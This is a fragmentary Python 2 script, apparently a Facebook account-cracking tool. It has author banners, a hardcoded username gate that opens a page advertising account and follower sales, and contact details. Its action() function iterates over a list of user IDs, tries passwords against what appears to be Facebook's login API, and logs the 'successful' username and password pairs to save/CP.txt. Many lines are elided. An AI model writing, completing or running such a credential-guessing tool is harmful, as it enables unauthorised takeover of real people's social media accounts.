...
__author__ = 'AWAIS TAHIR'
__copyright = 'All rights reserved . Copyright  Hasnat Khan'
CorrectUsername = 'Juttbrand'
os.system('clear')
loop = 'true'
while (loop == 'true'):
    ...
    if (username == CorrectUsername):
            ...
            time.sleep(1)
            os.system('xdg-open https://www.facebook.com/FOLL0WERS.AND.ACCOUNT.SELLER')
            os.system('clear')
            loop = 'false'
    else:
...
______________________________________________________________
 ...
 ​GitHub   :     TONU-143
 ​Whatsapp  :    +01759916221
 HACKER BD HACKER ON TABAHAI
 ​______________________________________________
 ​                                                 """ 
...
def action():
    ...
    os.system('clear')
    print logo
    jalan ('\x1b[1;92mUSE AIROPLANE MODE IF NO RESULT SHOW')
    print(47*'-')
    xxx = str(len(id))
    jalan('\x1b[1;96m              TOTAL IDS :\x1b[1;95m ' + xxx)
    print(47*'-')
    def main(arg):
        user = arg
        try:
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[92m  [Successful]  ' + k + c + user + '  |  ' + pass1
                okb = open('save/CP.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m  [Successful] ' + k + c + user + '  |  ' + pass1
                ...
                if 'access_token' in q:
                    ...
                    if 'access_token' in q:
                        ...
                        print '\x1b[1;91m  [Successful] ' + k + c + user + '  |  ' + pass4
                        cps = open('save/CP.txt', 'a')
    ...
    raw_input('\n\x1b[1;95m[\x1b[1;98mHasnat_menu_Back\x1b[1;95m]')
    login()
